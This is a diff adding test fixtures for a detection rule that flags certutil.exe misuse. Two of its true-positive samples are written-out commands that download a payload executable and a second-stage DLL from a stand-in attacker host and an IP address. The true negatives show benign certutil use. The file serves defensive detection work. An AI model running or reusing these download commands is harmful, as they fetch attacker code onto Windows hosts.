@@ -1,0 +1,11 @@
+rule_id: e5221b69-14e9-4024-8724-74f34f1a2a1a
+true_positives:
+  - Image: 'C:\Windows\System32\certutil.exe'
+    CommandLine: 'certutil.exe -urlcache -split -f http://198.51.100.7/payload.exe C:\Users\Public\p.exe'
+  - Image: 'C:\Windows\System32\certutil.exe'
+    CommandLine: 'certutil /urlcache /f https://evil.example/stage2.dll stage2.dll'
+true_negatives:
+  - Image: 'C:\Windows\System32\certutil.exe'
+    CommandLine: 'certutil -hashfile C:\temp\installer.msi SHA256'
+  - Image: 'C:\Windows\System32\certutil.exe'
+    CommandLine: 'certutil -urlcache *'
